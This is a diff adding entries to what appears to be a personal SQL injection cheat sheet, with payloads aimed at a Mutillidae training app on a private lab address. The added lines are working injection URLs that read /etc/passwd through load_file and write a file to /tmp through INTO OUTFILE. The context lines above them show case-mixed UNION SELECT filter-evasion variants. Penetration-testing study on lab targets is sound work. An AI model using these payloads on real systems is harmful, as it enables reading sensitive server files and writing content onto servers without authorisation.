@@ -36,3 +36,11 @@ orDer bY 1
 uNioN sEleCt 1,2 %23
 uNioN+sEleCt+1,2+%23
 uNioN/**/sEleCt/**/1,2/**/%23
+
+
+Reading and Writing files using SQLi
+http://192.168.1.123/mutillidae/index.php?page=user-info.php&username=admin'union select null,load_file('/etc/passwd'),null,null,null
+%23&password=adminpass&user-info-php-submit-button=View+Account+Details
+
+union select null, 'example example', null, null,null into outfile '/tmp/example.txt'
+http://192.168.1.123/mutillidae/index.php?page=user-info.php&username=admin'union select null, 'example example', null, null,null into outfile '/tmp/example.txt' %23&password=adminpass&user-info-php-submit-button=View+Account+Details
